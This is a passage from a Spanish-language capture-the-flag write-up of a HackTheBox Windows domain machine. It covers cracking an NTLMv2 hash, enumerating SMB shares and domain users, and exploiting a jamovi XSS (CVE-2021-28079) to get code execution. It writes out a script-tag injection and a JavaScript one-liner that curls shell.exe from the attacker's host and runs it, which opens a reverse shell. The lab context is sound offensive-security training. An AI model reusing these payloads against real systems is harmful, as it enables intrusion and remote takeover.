+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>WinRM-NTLMv2-10.10.11.102.txt
+localadmin::windcorp:ec8df8b609e70f41:208735772A1677823E7F75FA31D0C715:0101000000000000646B94F8C5D4DA01E2910B524E97D48700000000020008005700460056005A0001001E00570049004E002D0052005600450036005800380034004D00300045004C00040014005700460056005A002E004C004F00430041004C0003003400570049004E002D0052005600450036005800380034004D00300045004C002E005700460056005A002E004C004F00430041004C00050014005700460056005A002E004C004F00430041004C0008003000300000000000000000000000002100003BED58472DA82F8CAD355A301647ABF7E78023B354D051483303EF7C0F5FC5340A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00370034000000000000000000
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ya podemos crackear el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
+❯ john <span class="nt">--show</span> hash.txt
+localadmin:Secret123:windcorp:ec8df8b609e70f41:208735772A1677823E7F75FA31D0C715:0101000000000000646B94F8C5D4DA01E2910B524E97D48700000000020008005700460056005A0001001E00570049004E002D0052005600450036005800380034004D00300045004C00040014005700460056005A002E004C004F00430041004C0003003400570049004E002D0052005600450036005800380034004D00300045004C002E005700460056005A002E004C004F00430041004C00050014005700460056005A002E004C004F00430041004C0008003000300000000000000000000000002100003BED58472DA82F8CAD355A301647ABF7E78023B354D051483303EF7C0F5FC5340A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00370034000000000000000000
+
+1 password <span class="nb">hash </span>cracked, 0 left
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora tenemos credenciales <code class="language-plaintext highlighter-rouge">localadmin:Secret123</code> .</p>
+  </li>
+  <li>
+    <p>Son correctas en la máquina real.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> localadmin <span class="nt">-p</span> Secret123
+SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\l</span>ocaladmin:Secret123
+</code></pre></div></div>
+
+<h2 id="shell-as-diegocruz-and-user-flag">Shell as diegocruz and user flag</h2>
+
+<ul>
+  <li>Como tenemos credenciales validas podemos enumerar por RPC y podemos ver los nombres de los usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.102 <span class="nt">-U</span> <span class="s1">'localadmin%Secret123'</span> <span class="nt">-c</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[FalkUela] rid:[0xc26]
+user:[CurtisChav] rid:[0xc27]
+user:[RyderRoss] rid:[0xc28]
+user:[TammyLawr] rid:[0xc29]
+user:[ZoePerk] rid:[0xc2a]
+user:[AgnieszkaFour] rid:[0xc2b]
+user:[IgorCarv] rid:[0xc2c]
+user:[Denada R] rid:[0xc2d]
+user:[AmyBouc] rid:[0xc2e]
+user:[BaptisteCaro] rid:[0xc2f]
+user:[JonathanPayn] rid:[0xc30]
+user:[محمدمهدیحیدر] rid:[0xc31]
+user:[AlyssiaDavi] rid:[0xc32]
+user:[SusanaSoto] rid:[0xc33]
+user:[IslaLatt] rid:[0xc34]
+user:[KellyGran] rid:[0xc35]
+user:[SkyVan <span class="o">]</span> rid:[0xc36]
+user:[AnitaStro] rid:[0xc37]
+user:[YasminSchm] rid:[0xc38]
+user:[EvaMath] rid:[0xc39]
+user:[MelodieNova] rid:[0xc3a]
+user:[MareikeZiel] rid:[0xc3b]
+user:[NihalKunt] rid:[0xc3c]
+user:[SohamCoop] rid:[0xc3d]
+user:[DarrenLong] rid:[0xc3e]
+user:[ÜlküTunç] rid:[0xc3f]
+user:[FelixWill] rid:[0xc40]
+user:[ElizabethMarg] rid:[0xc41]
+user:[AriannaGray] rid:[0xc42]
+user:[تیناعلیز] rid:[0xc43]
+user:[CoryMurr] rid:[0xc44]
+user:[AnatoleMich] rid:[0xc45]
+user:[آویننجات] rid:[0xc46]
+user:[NevilleVan <span class="o">]</span> rid:[0xc47]
+user:[LeanaOliv] rid:[0xc48]
+user:[PhilipJørg] rid:[0xc49]
+user:[FernandoMcco] rid:[0xc4a]
+user:[IsabellaAnde] rid:[0xc4b]
+user:[IndiraCarv] rid:[0xc4c]
+user:[MartinIgle] rid:[0xc4d]
+user:[SammyCald] rid:[0xc4e]
+user:[PatriciaRoge] rid:[0xc4f]
+user:[SamuHeik] rid:[0xc50]
+user:[BrielleGinn] rid:[0xc51]
+user:[HollyWatt] rid:[0xc52]
+user:[GuillermoFuen] rid:[0xc53]
+user:[MaltheKris] rid:[0xc54]
+user:[AstridThom] rid:[0xc55]
+user:[SohailaWitv] rid:[0xc56]
+user:[MerithLand] rid:[0xc57]
+user:[HaileyWill] rid:[0xc58]
+user:[MelvinFour] rid:[0xc59]
+user:[NurdanGönü] rid:[0xc5a]
+user:[ElsaRaut] rid:[0xc5b]
+user:[NicolaiNeub] rid:[0xc5c]
+user:[GeorgeMore] rid:[0xc5d]
+user:[BarthelomeusTukk] rid:[0xc5e]
+user:[JustinaGöpf] rid:[0xc5f]
+user:[YaseminKumc] rid:[0xc60]
+user:[VanessaMart] rid:[0xc61]
+user:[GabriëllaVisk] rid:[0xc62]
+user:[AfetErbu] rid:[0xc63]
+user:[MontserratHida] rid:[0xc64]
+user:[CourtneyRose] rid:[0xc65]
+user:[AbigailKell] rid:[0xc66]
+user:[TomGrah] rid:[0xc67]
+user:[LouisonThom] rid:[0xc68]
+user:[RogerSanc] rid:[0xc69]
+user:[مهدیسکریم] rid:[0xc6a]
+user:[ValentinGome] rid:[0xc6b]
+user:[OliviaSalm] rid:[0xc6c]
+user:[DennisWade] rid:[0xc6d]
+user:[DenyVan <span class="o">]</span> rid:[0xc6e]
+user:[CecilieMads] rid:[0xc6f]
+user:[CecilieChri] rid:[0xc70]
+user:[AugusteGira] rid:[0xc71]
+user:[LærkeOlse] rid:[0xc72]
+user:[AiméeRodr] rid:[0xc73]
+user:[VernonGuti] rid:[0xc74]
+user:[AliGerl] rid:[0xc75]
+user:[BuseNuma] rid:[0xc76]
+user:[ClaraMoli] rid:[0xc77]
+user:[AdemPekt] rid:[0xc78]
+user:[JacobTurn] rid:[0xc79]
+user:[InmaculadaGuer] rid:[0xc7a]
+user:[VickieGuti] rid:[0xc7b]
+user:[ShellyGran] rid:[0xc7c]
+user:[EmmaPoul] rid:[0xc7d]
+user:[HeatherHarr] rid:[0xc7e]
+user:[VilmaKjel] rid:[0xc7f]
+user:[LeanaEnge] rid:[0xc80]
+user:[UmutAkgü] rid:[0xc81]
+user:[JorianAppe] rid:[0xc82]
+user:[DavePerk] rid:[0xc83]
+user:[IsabelleWang] rid:[0xc84]
+user:[KathleenMyer] rid:[0xc85]
+user:[NotburgaKäfe] rid:[0xc86]
+user:[RasmusRant] rid:[0xc87]
+user:[MohamedAria] rid:[0xc88]
+user:[AbigailGray] rid:[0xc89]
+user:[JuliaPell] rid:[0xc8a]
+user:[ReginaldoJesu] rid:[0xc8b]
+user:[HaileyFren] rid:[0xc8c]
+user:[EzraBrow] rid:[0xc8d]
+user:[EvelynNesh] rid:[0xc8e]
+user:[SarahScot] rid:[0xc8f]
+user:[ViljamiLatv] rid:[0xc90]
+user:[LoganDixo] rid:[0xc91]
+user:[کیاناقاسم] rid:[0xc92]
+user:[MillePede] rid:[0xc93]
+user:[طاهازارع] rid:[0xc94]
+user:[LenniMart] rid:[0xc95]
+user:[CesarLoza] rid:[0xc96]
+user:[SebastianJoha] rid:[0xc97]
+user:[GundelDree] rid:[0xc98]
+user:[Hans-WolfgangTill] rid:[0xc99]
+user:[EdwardGilb] rid:[0xc9a]
+user:[LoganWalk] rid:[0xc9b]
+user:[TakeEdel] rid:[0xc9c]
+user:[ZehraWeis] rid:[0xc9d]
+user:[LolaDani] rid:[0xc9e]
+user:[OliverTikk] rid:[0xc9f]
+user:[SeanCarr] rid:[0xca0]
+user:[JoseSmyt] rid:[0xca1]
+user:[AntonKaup] rid:[0xca2]
+user:[FlorenceRamo] rid:[0xca3]
+user:[DavidLecl] rid:[0xca4]
+user:[ZakariaeVan <span class="o">]</span> rid:[0xca5]
+user:[FranciscoMeun] rid:[0xca6]
+user:[MeganScot] rid:[0xca7]
+user:[LyamMass] rid:[0xca8]
+user:[OlveSund] rid:[0xca9]
+user:[AndreaLefe] rid:[0xcaa]
+user:[JuddSimm] rid:[0xcab]
+user:[KübraKoço] rid:[0xcac]
+user:[DiegoCruz] rid:[0xcad]
+user:[MaryMaso] rid:[0xcae]
+user:[EmmettØstm] rid:[0xcaf]
+user:[LyamRodr] rid:[0xcb0]
+user:[UliBeut] rid:[0xcb1]
+user:[RileyMill] rid:[0xcb2]
+user:[یلداكامي] rid:[0xcb3]
+user:[AlexisRoll] rid:[0xcb4]
+user:[LinneaLait] rid:[0xcb5]
+user:[LenniHarj] rid:[0xcb6]
+user:[TimWelc] rid:[0xcb7]
+user:[JoaquinLoza] rid:[0xcb8]
+user:[ThomasPerr] rid:[0xcb9]
+user:[VilhoRaja] rid:[0xcba]
+user:[KittySton] rid:[0xcbb]
+user:[MucahitVan <span class="o">]</span> rid:[0xcbc]
+user:[RicardoHunt] rid:[0xcbd]
+user:[ElsaDuma] rid:[0xcbe]
+user:[RalphMaiw] rid:[0xcbf]
+user:[JordiGuer] rid:[0xcc0]
+user:[LutzHell] rid:[0xcc1]
+user:[LucyFont] rid:[0xcc2]
+user:[Afonso HenriquesMend] rid:[0xcc3]
+user:[Karl-HermannSchl] rid:[0xcc4]
+user:[TorstenBätz] rid:[0xcc5]
+user:[DewyLier] rid:[0xcc6]
+user:[کیاناپارس] rid:[0xcc7]
+user:[JonathanBeni] rid:[0xcc8]
+user:[MitchellHill] rid:[0xcc9]
+user:[GaëtanAube] rid:[0xcca]
+user:[حامدرضای] rid:[0xccb]
+user:[ZéliaTeix] rid:[0xccc]
+user:[LícioMora] rid:[0xccd]
+user:[DannyWeis] rid:[0xcce]
+user:[SofieKind] rid:[0xccf]
+user:[MarieJoha] rid:[0xcd0]
+user:[LeanneYoun] rid:[0xcd1]
+user:[EemilLepp] rid:[0xcd2]
+user:[LiamMore] rid:[0xcd3]
+user:[BarbaraWebb] rid:[0xcd4]
+user:[localadmin] rid:[0xcd9]
+</code></pre></div></div>
+
+<ul>
+  <li>Podríamos probar un ASREPRoast Attack <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a> pero al parecer hay un problema con el puerto 88 y no se ejecuta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetNPUsers windcorp.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt <span class="nt">-debug</span>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span>+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+<span class="o">[</span>+] Trying to connect to KDC at WINDCORP.HTB:88
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.102 <span class="nt">-U</span> <span class="s1">'localadmin%Secret123'</span> <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\[</span><span class="s2">.*?</span><span class="se">\]</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"0x"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
+❯ <span class="nb">wc</span> <span class="nt">-l</span> users.txt
+179 users.txt
+</code></pre></div></div>
+
+<ul>
+  <li>Así que vamos a listar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> localadmin <span class="nt">-p</span> Secret123  <span class="nt">--shares</span>
+SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\l</span>ocaladmin:Secret123
+SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] Enumerated shares
+SMB         10.10.11.102    445    EARTH            Share           Permissions     Remark
+SMB         10.10.11.102    445    EARTH            <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.11.102    445    EARTH            ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.11.102    445    EARTH            C<span class="nv">$ </span>                             Default share
+SMB         10.10.11.102    445    EARTH            CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.10.11.102    445    EARTH            IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.11.102    445    EARTH            NETLOGON        READ            Logon server share
+SMB         10.10.11.102    445    EARTH            Shared          READ
+SMB         10.10.11.102    445    EARTH            SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos privilegios de lectura en <code class="language-plaintext highlighter-rouge">Shared</code> vamos a ver que hay dentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.102/Shared <span class="nt">-U</span> windcorp.htb/localadmin Secret123
+Password <span class="k">for</span> <span class="o">[</span>WINDCORP.HTB<span class="se">\l</span>ocaladmin]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Wed Apr 28 10:06:06 2021
+  ..                                  D        0  Wed Apr 28 10:06:06 2021
+  Documents                           D        0  Mon Apr 26 23:09:25 2021
+  Software                            D        0  Thu Jul 22 13:14:16 2021
+
+		9034239 blocks of size 4096. 3227232 blocks available
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vemos archivos <code class="language-plaintext highlighter-rouge">.omv</code> <a href="https://docs.jamovi.org/_pages/info_file-format.html">https://docs.jamovi.org/_pages/info_file-format.html</a>.</p>
+  </li>
+  <li>
+    <p>En la web de jamovi nos dicen que hay archivos en un zip.</p>
+  </li>
+  <li>
+    <p>Vamos a descargarnos los archivos.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\&gt;</span> mget <span class="k">*</span>.omv
+Get file Big 5.omv? y
+getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\B</span>ig 5.omv of size 6455 as Big 5.omv <span class="o">(</span>14.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 14.1 KiloBytes/sec<span class="o">)</span>
+Get file Bugs.omv? y
+getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\B</span>ugs.omv of size 2897 as Bugs.omv <span class="o">(</span>6.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 10.4 KiloBytes/sec<span class="o">)</span>
+Get file Tooth Growth.omv? y
+getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\T</span>ooth Growth.omv of size 2142 as Tooth Growth.omv <span class="o">(</span>4.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 8.6 KiloBytes/sec<span class="o">)</span>
+Get file Whatif.omv? y
+getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\W</span>hatif.omv of size 2841 as Whatif.omv <span class="o">(</span>6.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 8.1 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que en este archivo es donde se encuentran los archivos que nos decían en la web.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z l Whatif.omv
+
+7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
+ 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 2841 bytes <span class="o">(</span>3 KiB<span class="o">)</span>
+
+Listing archive: Whatif.omv
+
+<span class="nt">--</span>
+Path <span class="o">=</span> Whatif.omv
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 2841
+
+   Date      Time    Attr         Size   Compressed  Name
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2021-04-27 11:38:38 .....          106           74  META-INF/MANIFEST.MF
+2021-04-27 11:38:38 .....         2505          823  index.html
+2021-04-27 11:38:40 .....         1575          317  metadata.json
+2021-04-27 11:38:40 .....          114           76  xdata.json
+2021-04-27 11:38:40 .....         5400          871  data.bin
+2021-04-27 11:38:40 .....           50           46  01 empty/analysis
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2021-04-27 11:38:40               9750         2207  6 files
+</code></pre></div></div>
+
+<ul>
+  <li>Si vemos con la herramienta <code class="language-plaintext highlighter-rouge">smbcacls</code> los privilegios vemos que los usuarios tienen privilegio FULL en el directorio donde nos descargamos todo eso significa que podemos escribir dentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbcacls <span class="nt">-U</span> localadmin%Secret123 <span class="s2">"//windcorp.htb/Shared"</span> <span class="s2">"Documents/Analytics"</span>
+REVISION:1
+CONTROL:SR|DI|DP
+OWNER:WINDCORP<span class="se">\D</span>iegoCruz
+GROUP:WINDCORP<span class="se">\D</span>omain Users
+ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/OI|CI/FULL
+ACL:NT AUTHORITY<span class="se">\S</span>YSTEM:ALLOWED/OI|CI|I/FULL
+ACL:BUILTIN<span class="se">\A</span>dministrators:ALLOWED/OI|CI|I/FULL
+ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/OI|CI|I/READ
+ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/CI|I/0x00000004
+ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/CI|I/0x00000002
+ACL:WINDCORP<span class="se">\D</span>iegoCruz:ALLOWED/I/FULL
+ACL:CREATOR OWNER:ALLOWED/OI|CI|IO|I/0x10000000
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a descomprimir para examinar los archivos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip Whatif.omv
+Archive:  Whatif.omv
+  inflating: META-INF/MANIFEST.MF
+  inflating: index.html
+  inflating: metadata.json
+  inflating: xdata.json
+  inflating: data.bin
+  inflating: 01 empty/analysis
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Si buscamos vulnerabilidades sobre esto encontramos un CVE sobre un XSS <a href="https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md">https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md</a>.</p>
+  </li>
+  <li>
+    <p>Aquí nos dicen como explotarlo <a href="https://github.com/g33xter/CVE-2021-28079">https://github.com/g33xter/CVE-2021-28079</a>.</p>
+  </li>
+  <li>
+    <p>La vulnerabilidad ocurre en el campo “name”.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>metadata.json | jq | <span class="nb">head</span>
+<span class="o">{</span>
+  <span class="s2">"dataSet"</span>: <span class="o">{</span>
+    <span class="s2">"rowCount"</span>: 150,
+    <span class="s2">"columnCount"</span>: 5,
+    <span class="s2">"removedRows"</span>: <span class="o">[]</span>,
+    <span class="s2">"addedRows"</span>: <span class="o">[]</span>,
+    <span class="s2">"fields"</span>: <span class="o">[</span>
+      <span class="o">{</span>
+        <span class="s2">"name"</span>: <span class="s2">"Sepal.Length"</span>,
+        <span class="s2">"id"</span>: 1,
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>En el POC nos dicen que podemos cargar un archivo <code class="language-plaintext highlighter-rouge">.js</code> en ese campo.</p>
+  </li>
+  <li>
+    <p>Vamos a editarlo para que nos cargue nuestro propio <code class="language-plaintext highlighter-rouge">.js</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>metadata.json | jq | <span class="nb">head</span>
+<span class="o">{</span>
+  <span class="s2">"dataSet"</span>: <span class="o">{</span>
+    <span class="s2">"rowCount"</span>: 150,
+    <span class="s2">"columnCount"</span>: 5,
+    <span class="s2">"removedRows"</span>: <span class="o">[]</span>,
+    <span class="s2">"addedRows"</span>: <span class="o">[]</span>,
+    <span class="s2">"fields"</span>: <span class="o">[</span>
+      <span class="o">{</span>
+        <span class="s2">"name"</span>: <span class="s2">"&lt;script src=</span><span class="se">\"</span><span class="s2">http://10.10.14.74/yiyi.js</span><span class="se">\"</span><span class="s2">&gt;&lt;/script&gt;"</span>,
+        <span class="s2">"id"</span>: 1,
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a comprimir todo otra vez para meterlo en el recurso compartido ya que tenemos privilegios “se fueron algunos archivos que tenia que no tiene nada que ver pero no importa”.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip <span class="nt">-r</span> Whatif.omv <span class="nb">.</span>
+updating: META-INF/MANIFEST.MF <span class="o">(</span>deflated 30%<span class="o">)</span>
+updating: index.html <span class="o">(</span>deflated 67%<span class="o">)</span>
+updating: metadata.json <span class="o">(</span>deflated 78%<span class="o">)</span>
+updating: xdata.json <span class="o">(</span>deflated 33%<span class="o">)</span>
+updating: data.bin <span class="o">(</span>deflated 84%<span class="o">)</span>
+updating: 01 empty/analysis <span class="o">(</span>deflated 8%<span class="o">)</span>
+  adding: Tooth Growth.omv <span class="o">(</span>deflated 14%<span class="o">)</span>
+  adding: shell.exe <span class="o">(</span>deflated 75%<span class="o">)</span>
+  adding: vnp <span class="o">(</span>deflated 5%<span class="o">)</span>
+  adding: hash.txt <span class="o">(</span>deflated 62%<span class="o">)</span>
+  adding: req.txt <span class="o">(</span>deflated 23%<span class="o">)</span>
+  adding: Big 5.omv <span class="o">(</span>deflated 5%<span class="o">)</span>
+  adding: 01 empty/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: chisel_1.9.1_linux_amd64 <span class="o">(</span>deflated 59%<span class="o">)</span>
+  adding: chisel.exe <span class="o">(</span>deflated 59%<span class="o">)</span>
+  adding: creds.txt <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: Captura.cap <span class="o">(</span>deflated 48%<span class="o">)</span>
+  adding: users.txt <span class="o">(</span>deflated 34%<span class="o">)</span>
+  adding: Bugs.omv <span class="o">(</span>deflated 10%<span class="o">)</span>
+  adding: META-INF/ <span class="o">(</span>stored 0%<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a crear el archivo <code class="language-plaintext highlighter-rouge">.js</code> para enviarnos una reverse shell vamos a usar el .exe que ya teníamos con <code class="language-plaintext highlighter-rouge">msfvenom</code> para que lo guarde en la ruta <code class="language-plaintext highlighter-rouge">ProgramData</code> y después lo ejecute.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>yiyi.js
+require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.exec<span class="o">(</span><span class="s1">'curl 10.10.14.74/shell.exe -o C:\\ProgramData\\shell.exe &amp;&amp; C:\\ProgramData\\shell.exe'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ejecutamos un servidor http con python3 para que lo descargue.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora metemos el comprimido en la carpeta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbclient windcorp.htb/localadmin:Secret123@earth.windcorp.htb
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Type <span class="nb">help </span><span class="k">for </span>list of commands
+<span class="c"># use Shared</span>
+<span class="c"># cd Documents\Analytics</span>
+<span class="c"># put Whatif.omv</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y nos ponemos en escucha para esperar que se ejecute.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Una vez ejecutado todo nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.102 - - <span class="o">[</span>14/Jul/2024 14:06:05] <span class="s2">"GET /yiyi.js HTTP/1.1"</span> 200 -
+10.10.11.102 - - <span class="o">[</span>14/Jul/2024 14:06:05] <span class="s2">"GET /shell.exe HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<ul>
+  <li>Nos llega la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 50589
+Windows PowerShell running as user diegocruz on EARTH
+Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>windcorp<span class="se">\d</span>iegocruz
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\d</span>iegocruz<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+604f02b0879f8657d4e73b20efb04851
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios-and-root-flag">Escalada de privilegios and root flag</h2>
+
+<ul>
+  <li>
+    <p>Si recordamos en los recursos compartidos de SMB encontramos una recurso llamado <code class="language-plaintext highlighter-rouge">CertEnroll</code> que funciona para el despliegue de certificados.</p>
+  </li>
+  <li>
+    <p>Podemos usar Certify.exe para buscar <code class="language-plaintext highlighter-rouge">templates</code> vulnerables como ya lo hemos hecho en otras máquinas <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\C</span>ertify.exe find /vulnerable /currentuser
+
+   _____          _   _  __
+  / ____|        | | <span class="o">(</span>_<span class="o">)</span>/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ <span class="se">\ </span><span class="s1">'__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using current user'</span>s unrolled group SIDs <span class="k">for </span>vulnerability checks.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the search base <span class="s1">'CN=Configuration,DC=windcorp,DC=htb'</span>
+
